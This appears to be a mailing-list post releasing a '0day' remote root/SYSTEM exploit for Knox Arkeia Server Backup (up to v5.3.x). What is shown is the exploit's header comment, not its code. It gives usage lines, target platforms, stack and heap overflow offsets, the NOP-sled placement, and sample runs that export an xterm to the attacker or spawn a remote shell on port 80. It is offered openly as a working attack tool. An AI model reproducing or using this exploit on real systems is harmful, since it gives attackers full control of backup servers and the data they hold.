Subject: Knox Arkeia remote root/system exploit

0day cuz i'm bored

/*
* Knox Arkeia Server Backup
* arkeiad local/remote root exploit
* Targets for Redhat 7.2/8.0, Win2k SP2/SP3/SP4, WinXP SP1, Win 2003 EE
* Works up to current version 5.3.x
*
* ---------------
*
* Linux x86:
* ./arksink2 <arkeia_host> <target_type> <display>
*
* Exports an xterm to the box of your choosing.  Make sure to "xhost +" on
* the box you're exporting to.
*
* A stack overflow is in the processing of a type 77 request.  EIP is 
actually
* overwritten at 64 bytes, but the trailing NULL scrambled a pointer so we
* have to write past EIP and insert a "safe" value.  Put this value behind 
your
* NOP+sc return address so it doesn't mess with the sled.
*
* Since the buffer is so small, we initially send an invalid packet that 
ends
* up on the heap a second before the overflow happens.  If it is a high 
traffic
* Arkeia server the heap might be a bit volatile, so play around with 
putting
* nops+sc after the overwritten pointer.  The heap method avoids non-exec 
stack
* protection, however.
*
* Includes targets for RH8 and RH7.2
*
* [user@...t user]$ ./prog 192.168.1.2 1 192.168.1.1:0
* [*] Knox Arkeia <= v5.3.x remote root/SYSTEM exploit
* [*] Attacking LINUX system
* [*] Exporting xterm to 192.168.1.1:0
* [*] Connected to 192.168.1.2:617 NOP+shellcode socket
* [*] Connected to 192.168.1.2:617 overflow socket
* [*] Sending nops+shellcode
* [*] Done, sleeping
* [*] Done, check for xterm
*
*
* ---------------
*
* Windows x86:
* ./prog <host> <target> <offset>
*
* Spawns a shell on port 80 of the remote host
*
* EIP is overwritten beginning with the 25th byte after the header.  Since 
Windows
* is little endian and has the heap mapped to 0x00XXXXXX we can avoid having 
to
* write an extra null past EIP.  Another advantage here is that we can put 
all our
* nops and shellcode in the same packet, but after the NULL.  They will not 
be copied
* onto the stack (and therefore not munge the pointer after it) but will 
remain
* in memory as a raw packet.  Fire up ollydbg, search for your nops and 
voila.
*
* [user@...t user]$ ./arksink2 192.168.1.2 3 0
* [*] Knox Arkeia <= v5.3.x remote SYSTEM exploit
* [*] Attacking Windows system
* [*] Spawning shell on 192.168.1.2:80
* [*] Connected to 192.168.1.2:617 overflow socket
* [*] Sending overflow
